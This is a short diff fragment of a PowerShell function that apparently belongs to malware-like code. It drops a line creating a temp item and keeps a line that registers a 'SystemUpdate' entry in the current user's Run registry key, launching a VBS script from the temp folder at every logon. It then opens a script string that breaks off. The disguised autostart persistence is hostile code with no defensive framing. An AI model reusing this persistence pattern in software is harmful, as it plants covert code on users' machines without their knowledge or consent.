@@ -1,7 +1,5 @@
 function get-a {
 
-New-Item -Path "$env:temp/SystemUpdate.vbs" -ItemType Directory -Force
-
 Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "SystemUpdate" "wscript `"$env:temp/SystemUpdate.vbs`"" -Force
 
 $psScript = @"
